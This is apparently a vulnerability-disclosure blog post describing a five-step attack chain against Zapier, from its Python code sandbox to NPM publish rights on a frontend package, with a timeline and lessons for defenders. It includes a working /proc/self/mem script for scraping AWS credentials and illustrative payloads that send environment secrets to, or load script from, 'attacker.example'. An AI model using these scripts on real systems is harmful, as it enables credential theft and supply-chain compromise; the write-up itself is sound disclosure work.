---
title: "Zapocalypse: The Attack Chain That Could Have Hijacked Zapier"
source_url: http://www.token.security/blog/zapocalypse-the-attack-chain-that-could-have-hijacked-zapier
ingested: 2026-06-06
sha256: auto
tags: [article]
---

Starting from a sandboxed Python code block on Zapier's free tier, the Token Security research team walked a five-step chain that ended with node package manager (NPM) publishing rights to zapier-design-system, a private package that ships JavaScript into every authenticated Zapier user's browser. Publishing a tampered version could have shipped attacker-controlled JavaScript **could have executed in every authenticated Zapier session**, allowing for full platform account takeover (ATO).

No zero-day. No novel primitive. Five known patterns, composed:

| # | Stage | Primitive |
| --- | --- | --- |
| 1 | Sandbox reconnaissance | `os.system` works inside "Code by Zapier" |
| 2 | Credential recovery | STS tokens "orphaned" in the Lambda heap, scraped via `/proc/self/mem` |
| 3 | Lateral movement | A role literally named `allow_nothing_role` permitted ECR enumeration and image pulls |
| 4 | Secret hunting | A high-privilege NPM token leaked in container build metadata |
| 5 | Supply-chain reach | Publishing rights into a design-system package loaded on `zapier.com` |

Token Security reported the vulnerability (now known as [Zapocalypse](https://www.token.security/zapocalypse)) on February 12, 2026. It was acknowledged within hours by Zapier and the NPM token was revoked and the ECR role tightened by February 16, 2026. Zapier confirmed full remediation on March 5, 2026. Bounty: program maximum, $3,000, with Zapier committing to review the cap.

The rest of this post is the long version, written for researchers who want the actual scripts and the actual reasoning behind each link in the chain. Important framing note up front: a hijacked authenticated Zapier session would have let an attacker act as the user inside Zapier, allowing them to create Zaps, Tables, MCP servers, and leverage that user's existing connections through the platform. It would not have yielded raw OAuth tokens or API credentials for connected services. Those credentials live server-side and never reach the browser. That distinction matters and runs through the entire write-up.

## **Why Zapier**

One month before the fwd:cloudsec call for speaking submissions closed, we were deep into research on a number of AI platforms and tools. We were looking at:

1.   **AI-adjacent or AI-touching.** Where new code, new attack surface, and the most stretched threat models live in 2026.
2.   **Not a hyperscaler.** Disclosure timelines on AWS/GCP/Azure are months, not weeks. We only had weeks.
3.   **A code-execution surface in the product.** Where attacker code is _invited_ into the system, not smuggled in.
4.   **No recent public CVEs.** Greenfield. Somewhere a smart researcher hadn't already plowed.

The signal that made us pull the trigger on Zapier was _n8n_: four sandbox-escape CVEs in 2025 in n8n's Code node. Four. In a year. That isn't an n8n problem. That's a category problem. And nobody had publicly looked at Zapier yet.

The multipliers, once we picked it:

*   8,000+ third-party integrations a user could be connected to through the platform
*   Millions of established users
*   "The SaaS that connects your SaaS," juicy crown jewel for a supply-chain story.

We signed up for a paid plan, opened the visual editor, and clicked on the "Code by Zapier" step.

## **Stage 1: Escaping the Code Block Sandbox**

"Code by Zapier" lets you write arbitrary Python (or JavaScript) inside a Zap. It is advertised as a place where users run their own logic. So we ran our own logic.

First poke: does os.system exist?

```
import os
os.system('env')
```

It runs and the output is glorious:

```
AWS_LAMBDA_FUNCTION_VERSION=1
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/prd-mngd-lmbd_paidcodeapipy3_z349279347
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_STREAM_NAME=2026/02/15/[1]ca626535d2104cb9bd0b1c8801bdba4eAWS_LAMBDA_RUNTIME_API=169.254.100.1:9001
AWS_EXECUTION_ENV=AWS_Lambda_python3.11
AWS_LAMBDA_FUNCTION_NAME=prd-mngd-lmbd_paidcodeapipy3_z349279347
AWS_REGION=us-east-1
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
_HANDLER=lambda_function.lambda_handlerAWS_LAMBDA_FUNCTION_MEMORY_SIZE=256_=/usr/bin/env
```

Three things immediately:

*   We're on **AWS Lambda**, `python3.11`, `us-east-1`.
*   The handler is `lambda_function.lambda_handle`. There's a Python file on disk.
*   There are no obvious AWS credentials in the environment. This is curious, because Lambda execution roles normally inject `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`. Where did they go?

`os.listdir('/var/task')` and a quick `open()` answers that question.

```
# lambda_function.py — verbatim, as it appeared on disk
import requests  # NOQA
from store_api import StoreClient  # NOQA

try:
	basestring
except NameError:
	basestring = str

def lambda_handler(event, context=None):
    # note - this isn't a security thing since we pass a allow_nothing role - just avoids
    # responding to dozens of annoying false positive security reports
    import os
    if os.environ.get('AWS_LAMBDA_FUNCTION_VERSION') or os.environ.get('AWS_LAMBDA_FUNCTION_NAME'):
        for k in list(os.environ.keys()):
            if k in ('AWS_ACCESS_KEY_ID', 'AWS_SECURITY_TOKEN', 'AWS_SESSION_TOKEN', 'AWS_SECRET_ACCESS_KEY'):
                os.environ[k] = 'null'
                del os.environ[k]
        del k
        del os
    assert event['code']
    assert event['method']
    assert event['bundle']
    _locals = locals().copy()
    _globals = globals().copy()
    del _locals['event']
    del _locals['context']
    del _globals['lambda_handler']
    content = f'# -*- coding: utf-8 -*-\\n{event["code"]}'.encode('utf-8')
    exec(content, _globals, _locals)
    _desired_function = _locals[event['method']]
    results = _desired_function(event['bundle'])
    return {'results': results}
```

Two things to dwell on here. The first is the architecture: the user's Python code is fed into `exec()` inside the same process that just held AWS credentials. The second is the comment:

`# note - this isn't a security thing since we pass a allow_nothing role - just avoids responding to dozens of annoying false positive security reports`

In other words, the env-var scrubbing is hygiene, not defense. The actual security control was meant to be the IAM role's name, `allow_nothing_role`. Two assumptions are baked into that comment:

1.   `del os.environ[k]` makes the credentials irrecoverable.
2.   The role allows nothing.

Both turn out to be wrong, and the rest of this post is what happens when they unravel.

## **Stage 2: `del` is not deletion**

If you're a Python developer, you already know where this is going. `del os.environ[k]` does two things:

*   It calls `unsetenv(k)` in the underlying libc, so a fresh `getenv` on that name returns `NULL`.
*   It removes the corresponding entry from the `os.environ` mapping, which decrements the reference count on the value `PyObject`.

What it does **not** do is overwrite the bytes that held the value. CPython's small-string interning, the heap arenas where `bytes` and `str` objects are allocated, the Lambda runtime's own buffers that fed the env block into the process in the first place — none of that gets zeroed. Those credential bytes — the STS access key, the secret, and the session token — are still sitting somewhere in the process address space, waiting to be re-used by a future allocation.

Lambda makes this even nicer for the attacker. Lambda containers are warm-started: a single container handles many invocations across many users. So even previous invocations' STS tokens are likely sitting around in memory until the container is recycled.

The exploit is just `/proc/self/mem` + a few regexes.

# extract_secrets_from_memory.py — runs inside the Zapier code block

import re

```
# extract_secrets_from_memory.py — runs inside the Zapier code block
import re

def scan_process_memory():
    results = {}

    try:
        with open('/proc/self/maps', 'r') as f:
            results['maps'] = f.read()[:2000]
    except Exception as e:
        results['maps_error'] = str(e)

    patterns = {
        'aws_key_id':  rb'(?:AKIA|ASIA)[0-9A-Z]{16}',
        'aws_secret':  rb'(AWS_SECRET_ACCESS_KEY=[^\\x00]+)',
        'aws_session': rb'AWS_SESSION_TOKEN=([A-Za-z0-9+/=]{100,1000})',
        'iqoj_token':  rb'(IQoJ[A-Za-z0-9+/=]{200,1000})',
    }

    MAX_REGION_SIZE = 10_000_000

    try:
        with open('/proc/self/mem', 'rb') as mem, \\
             open('/proc/self/maps', 'r') as maps:
            for line in maps:
                parts = line.split()
                if 'r' not in parts[1]:
                    continue

                start, end = (int(x, 16) for x in parts[0].split('-'))
                if end - start > MAX_REGION_SIZE:
                    continue

                try:
                    mem.seek(start)
                    data = mem.read(end - start)
                except Exception:
                    continue

                for name, pattern in patterns.items():
                    for match in re.finditer(pattern, data):
                        value = (match.group(1) if match.lastindex else match.group(0))
                        decoded = value[:1000].decode(errors='ignore')
                        results.setdefault(name, []).append(decoded)
    except Exception as e:
        results['mem_error'] = str(e)

    return {"A": str(results)}

return scan_process_memory()
```

Four patterns, the last of which (`IQoJ`) is what AWS prefixes session tokens with. This is the equivalent of greping for a known anchor instead of trying to detect base64 generically.

The script returns hits on all four patterns. We took the recovered credentials out of band and pointed `aws sts get-caller-identity` at them:

```
{
  "UserId": "AROA...:prd-mngd-lmbd_paidcodeapipy3_z347544606",
  "Account": "9960000000",
  "Arn": "arn:aws:sts::9960000000:assumed-role/allow_nothing_role/prd-mngd-lmbd_paidcodeapipy3_z347544606"
}
```

The credentials are live, they belong to `allow_nothing_role`, and the assumption that scrubbing `os.environ` made them irrecoverable is gone.

**Lesson 1:**`del os.environ[k]` is not deletion. The heap remembers.

The defensive answer is not better scrubbing. It's running user code in a different process that never sees the credential to begin with.

## **Stage 3: `allow_nothing_role` allowed plenty**

We had credentials. We did not yet have permissions. Time to verify.

We don't trust names. We verify. We pointed[enumerate-iam](https://github.com/andresriancho/enumerate-iam) at the recovered keys and let it brute-force the AWS read-only / list-only API surface.

```
[INFO] -- Account ARN : arn:aws:sts::996097627176:assumed-role/allow_nothing_role/prd-mngd-lmbd_paidcodeapipy3_z347544606
[INFO] -- ecr.describe_repositories() worked!
[INFO] -- dynamodb.describe_endpoints() worked!
[INFO] -- sts.get_caller_identity() worked!
[INFO] -- iam.get_account_password_policy() worked!
```

`ecr:DescribeRepositories` was the obvious unlock — combined with `ecr:BatchGetImage`, `ecr:ListImages`, and `ecr:GetDownloadUrlForLayer`, we had read access to the registry. _If_ we could actually pull the images.

We listed repositories:

```
ecr.describe_repositories()
# ... 1,111 entries
```

**1,111 repositories.** Zapier's private container registry, with read access for us. Time to pull.

The standard ECR pull flow goes through Docker: run `aws ecr get-login-password` to grab a temporary password, `docker login` with it, then `docker pull`. We ran step one and got back:

```
An error occurred (AccessDeniedException) when calling the GetAuthorizationToken
operation: User: arn:aws:sts::996097627176:assumed-role/allow_nothing_role/...
is not authorized to perform: ecr:GetAuthorizationToken
```

Of course. `allow_nothing_role` had leaked ECR read permissions, but not _that_ one. Without `GetAuthorizationToken`, no Docker login. Without Docker login, no `docker pull`. The front door was locked.

Under the hood, though, `docker pull` is just a sequence of ECR API calls: `BatchGetImage` to fetch the image manifest, `GetDownloadUrlForLayer` to get a presigned S3 URL for each layer, then HTTPS-download each layer as a gzipped tarball and reassemble. We had `BatchGetImage`. We had `GetDownloadUrlForLayer`. The only call we _didn't_ have was the Docker-flavored auth endpoint that `docker pull` wraps around them.

So we skipped Docker entirely. A Python script called the ECR APIs directly, fetched layers as raw HTTPS downloads from S3, and reassembled images locally. **No Docker runtime touched.** Any monitoring built around Docker — runtime sensors, image-scanning hooks, registry-side audit on `GetAuthorizationToken` — sees nothing.

That's the "API-only ECR image extraction" technique from the talk's abstract: same destination, different door. If you're protecting an ECR registry by restricting `ecr:GetAuthorizationToken` and assuming attackers can't pull, you're protecting the front door while the loading dock stays wide open.

The first pull was the `zapier` monorepo image. Production source code. We ran a secrets-scanner over it and got nothing exploitable — everything live looked encrypted-at-rest or already-rotated.

1,111 repos is a lot to scan one at a time. So we triaged:

*   Sort by `imagePushedAt` descending. Recent pushes are more likely to contain unrotated secrets — both because the build is fresh and because anyone who pushed a token in the last hour hasn't had time to notice and rotate.
*   Have an LLM rank the repo names for "likely to hold a secret" — anything named `deploy`, `ci`, `infra`, `tools`, `mcp`, `litellm`, etc., to the top.

Two repos surfaced. Each yielded a different secret. We'll take them one at a time.

## **Stage 3b — The LiteLLM container, and an email from a co-founder**

[LiteLLM](https://www.litellm.ai/) is an open-source AI gateway — 240M+ Docker pulls, used by Netflix, Y Combinator, and (it turns out) Zapier. The Zapier ECR had a private build of LiteLLM in it, and the build had been customized.

We pulled it and grepped for likely-looking keys. We hit one in `litellm/proxy/_experimental/mcp_server/mcp_server_manager.py`:

```
class MCPServerManager:
    def __init__(self):
        self.registry: Dict[str, MCPServer] = {}
        self.config_mcp_servers: Dict[str, MCPServer] = {}
        """
        eg.
        [
            "server-1": {
                "name": "zapier_mcp_server",
                "url": "<https://actions.zapier.com/mcp/sk-ak-…/sse>"
                "transport": "sse",
                "auth_type": "api_key"
            },
            "uuid-2": {
                "name": "google_drive_mcp_server",
                "url": "<https://actions.zapier.com/mcp/sk-ak-…/sse>"
            }
        ]
        """

        self.tool_name_to_mcp_server_name_mapping: Dict[str, str] = {}
        """
        {
            "gmail_send_email": "zapier_mcp_server",
        }
        """
```

A `sk-ak-…` token, hardcoded in source. The `sk-ak-` prefix is a **Zapier Actions MCP API key** — Zapier Actions is the MCP-flavored interface to Zapier's automation surface, and an MCP key authenticates a _specific Zapier user_ against a specific Zapier-Actions endpoint.

We did the MCP handshake against `actions.zapier.com` with the key and got a valid session immediately. From the session we extracted the user identity: the key belonged to **a co-founder of LiteLLM** — meaning the leaked credential authenticated us as a top-of-organization identity at the company behind LiteLLM, with access to their Gmail and Zapier integrations. A personal Zapier-Actions key, hardcoded into the LiteLLM image that Zapier was pulling and running.

The MCP session listed three available tools:

*   `gmail_send_email` — send mail from the co-founder's Gmail.
*   `edit_actions` — modify existing Zapier Actions on the account.
*   `add_actions` — add new integrations to the account.

For PoC we sent an email — from the co-founder's Gmail account, to a controlled inbox we owned. We could control the body. We couldn't control the subject. The mail landed.

![Image 1](https://cdn.prod.website-files.com/661a822ae40a7d51ecf449bc/6a17e7e99f26e0be24a8bfd6_4a745d41.png)

That's a phishing primitive of a different shape than the usual ones. Not domain-spoofing. Not a lookalike. **An email actually sent from a real co-founder's mailbox.** The DMARC/DKIM check passes because it really is their account.

## **Stage 3C: An NPM token, hiding in the container metadata**

The MCP key was a serious finding. It was also scoped to a single user. We kept fetching.

Our second-pass strategy sorted repos by `imagePushedAt`. The top entry had been pushed about an hour before we fetched it. Fresh.

This time the secret wasn't in the filesystem. We grepped, we found nothing interesting, and we were about to move on. Then, we fetched the image's config blob directly from the ECR API. The same `GetDownloadUrlForLayer` path we'd been using for layers, just pointed at the config digest from the manifest and looked at the `history[]` field.

Container image _config_ (the JSON metadata, not the filesystem layers) records the build steps that produced the image. If a build step ran `ARG NPM_TOKEN=...` or `ENV NPM_TOKEN=...` to feed a CI token into the build, that token can end up serialized into the image's config history and could be visible to anyone with `BatchGetImage` rights, even if it's nowhere on the filesystem of the running container.

It was there. An NPM publish token for a user account (used by GitLab CI to publish private `@zapier/*` packages). When we introspected the token via the NPM API, the metadata read:

```
{
  "action": "write",
  "scope.name": null,
  "bypass_2fa": true
}
```

`"action": "write"` = publish rights. `"scope.name": null` = unscoped to a specific package — applies to everything the account can publish. `"bypass_2fa": true` = doesn't prompt for second-factor, because CI tokens can't do interactive 2FA. The combination is "I can publish anything this account can publish, with no MFA gate."

We enumerated what the account could publish. The list spanned both **public** packages — Zapier's developer SDK that every integration builder installs from npm — and **private** internal ones:

*   [`zapier-platform-core`](https://www.npmjs.com/package/zapier-platform-core) — public; the SDK every Zapier integration developer installs
*   [`zapier-platform-cli`](https://www.npmjs.com/package/zapier-platform-cli) — public; the CLI for building integrations
*   z`apier-design-system` — private; bundled into the zapier.com frontend
*   a handful of other internal `@zapier/*` packages

**Lesson 2:**`ARG` is not a secret. Build history is public to anyone who can pull.

The defensive answer is build-time secret mounts (`RUN --mount=type=secret,id=npm,target=/run/secrets/npm`) or feeding the token through an out-of-band channel that never touches `ARG` / `ENV`.

## **Stage 4: One postinstall is all it would take**

Once you have the publish rights to a package that something in production depends on, supply-chain attacks against Node.js consumers are short.

The minimal payload is a `postinstall` hook in `package.json`:

```
{
  "name": "zapier-platform-core",
  "version": "X.Y.Z+1",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
```

```
// postinstall.js — illustrative, not executed against anyone
const env = Object.entries(process.env)
  .filter(([k]) => /TOKEN|KEY|SECRET|PASS|AWS_/i.test(k));
require('https').request({ host: 'attacker.example', method: 'POST' })
  .end(JSON.stringify(env));
```

`postinstall` runs automatically on `npm install`. No prompt. No user gesture. Whatever environment the install is running in, such as a developer's laptop, a CI runner, a GitHub Actions step, a production build server, gets its environment variables shipped to wherever the attacker chooses to send them.

The blast radius scales with how many places run `npm install @zapier/something` against the private registry. Every one of those places becomes a potential foothold.

We did not publish anything. We confirmed the publish capability via the NPM API and stopped. The HackerOne report demonstrates the capability, not the exploitation.

## **Stage 5: From package to stored XSS in the authenticated origin**

The `@zapier/zapier-platform-core` package is a backend dependency. The `@zapier/zapier-design-system` package is a frontend package. It ships UI components bundled into Zapier's webapp.

We opened `zapier.com` in Chrome, opened DevTools → Sources, and confirmed:

`zapier-design-system-9.25.1.js   (loaded on every authenticated page)`
That confirms reach. Code that we could publish to that package would land in every authenticated Zapier user's browser, served from `zapier.com`'s own origin, with no cross-origin restrictions.

What's proven is reach: a published version of the design-system package would execute in every authenticated `zapier.com` session, inside the origin's own security boundary. What an attacker could then do from inside that origin, whether session cookies are reachable from JavaScript, what LocalStorage actually holds, what's exposed in the DOM, depends on Zapier's defenses and was not part of our PoC. The chain stops at the publish capability. The payload below is illustrative, not a working exfil:

```
// Illustrative only — never published. A malicious patch could
// attach a script element into the authenticated DOM of every user
// loading zapier.com:
const s = document.createElement('script');
s.src = '<https://attacker.example/payload.js>';
document.head.appendChild(s);
```

From inside an authenticated `zapier.com` origin, the attacker's reachable impact is what the legitimate UI/API surface offers to the logged-in user. An attacker would have been able to act as the user inside Zapier: create Zaps, create Tables, create MCP servers, modify existing automations, and use the user's existing connections to third-party services through Zapier's platform. Those connections execute server-side. The attacker can drive them by riding the user's session and asking Zapier to do things. But, the attacker does not receive the underlying OAuth tokens or API keys for those services. Those credentials never reach the browser.

That distinction matters. The worst-case impact is full _Zapier_ account takeover (ATO), with all the downstream platform actions that implies. It is not a 1-for-1 takeover of every third-party service every user has connected.

It's still a severe vulnerability because of the multiplier: every Zapier user, every authenticated session, one published version away.

## **The chain, end-to-end**

Five primitives, composed:

1.   **Sandboxed Python.** Code execution surface in a product feature. `os.system` works.
2.   **`/proc/self/mem` regex.** Recover "orphaned" STS credentials from the Lambda heap.
3.   **`allow_nothing_role`.** A role whose name is a defensive claim, but whose actual policy enumerated allows ECR `DescribeRepositories`, `ListImages`, `BatchGetImage`, `GetDownloadUrlForLayer`.
4.   **Container metadata.** A high-privilege NPM publish token leaked through `ARG` / `ENV` into image config history.
5.   **NPM publish capability into a design-system package** that loads on `zapier.com`. Stored XSS in the authenticated origin. Allows for a full platform account takeover (ATO).

Each link is well-documented in isolation. The chain was the vulnerability.

There is also a sixth, narrower finding worth calling out separately: a hardcoded Zapier Actions MCP key in the LiteLLM container, scoped to a LiteLLM co-founder's account, that enabled email impersonation from their Gmail. That one is independent of the supply-chain chain — different secret, different blast radius, same disclosure.

## **Disclosure timeline**

Zapier ran a fast and responsive response. We want to call that out explicitly.

*   **Feb 10, 2026** — Research begins.
*   **Feb 12, 2026, 23:02 UTC** — Report #3552705 filed on HackerOne with three attachments (the memory scanner, the ECR repository list, and the layer-fetch script).
*   **Feb 13, 2026, 01:14 UTC** — Zapier acknowledges, requests our source IPs for log correlation.
*   **Feb 13–16, 2026** — Zapier investigates internally.
*   **Feb 16, 2026** — Zapier deploys an ECR deny policy on `allow_nothing_role` and revokes the NPM token. Report is re-classified from "LLM05: Supply Chain Vulnerabilities" to "Incorrect Default Permissions" and moved to **Triaged**.
*   **Feb 26, 2026** — Bounty paid at the program maximum (**$3,000**).
*   **Mar 5, 2026** — Remediation confirmed in place.
*   **Apr 21 – May 3, 2026** — Public-disclosure language reviewed and approved.
*   **May 5, 2026** — fwd:cloudsec session page goes public.
*   **June 1, 2026** — Talk + this blog.

Zapier triaged within four days, remediated within three weeks, and worked with us in good faith through disclosure. Worth saying out loud in a culture that often punishes disclosure programs for slowness.

## **Takeaways for defenders**

Six lessons. They are all things you can audit for tomorrow.

1.   **Sandbox escape is the default, not the exception.** If your product runs user code, assume an attacker could escape the sandbox. The defensive layer is the _blast radius around_ the sandbox, not the sandbox itself.
2.   **`del os.environ[k]` is not deletion. The heap remembers.** If you have credentials in a process, the only safe pattern is to run untrusted code in a _different_ process that never sees those credentials. Scrubbing after the fact is hygiene, not defense.
3.   **IAM names lie.**`allow_nothing_role` allowed plenty. Audit the _resolved permissions_ on every assumed role — every attached policy, every inline statement, every `Allow` action — and verify they match what the role name implies. The defense is real-permission validation, not naming convention.
4.   **Container images leak secrets two ways.** Build-time `ARG`/`ENV` values get serialized into image config history. Source files with hardcoded credentials get baked into the layer filesystem. Both are visible to anyone with `BatchGetImage`. Use Docker BuildKit secret mounts (`--mount=type=secret`) for build-time credentials, and scan container images for source-level secrets the same way you scan source repos.
5.   **Supply-chain hygiene runs both ways.** On the publish side: `bypass_2fa: true` + null scope = one published token away from an incident. Scope service NPM tokens to a single package and rotate aggressively. On the consume side: pin dependencies or lock-and-verify with `npm ci`, audit new versions of packages that run in your authenticated origin, and remember that `postinstall` runs whatever the publisher wants on every `npm install` — no prompt, no review.
6.   **Egress monitoring closes the loop.** The entire chain executed against Zapier's services _from outside Zapier's network_, with no observable alerts. Network-layer detection on outbound traffic from execution environments would have flagged the ECR enumeration step well before it became a 1,111-repo download. If your sandboxed-execution surface can talk to your own ECR, AWS APIs, or NPM registry from the user's network egress, that's a detection opportunity you're leaving on the floor.

See the Token Security “Zapocalypse” vulnerability report here: [www.token.security/zapocalypse](http://www.token.security/zapocalypse)